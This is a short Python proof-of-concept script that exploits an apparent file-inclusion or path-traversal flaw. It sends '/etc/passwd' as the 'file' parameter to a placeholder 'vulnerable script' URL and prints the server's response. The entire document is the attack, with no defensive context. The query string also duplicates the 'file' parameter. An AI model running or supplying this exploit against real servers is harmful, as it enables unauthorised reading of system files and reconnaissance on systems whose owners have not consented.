# Import the required libraries
import requests

# Define the URL of the vulnerable script
url = "http://example.com/script.php?file=index"

# Send a request to the vulnerable script with a malicious file path
response = requests.get(url, params={"file": "/etc/passwd"})

# Print the response from the server
print(response.text)
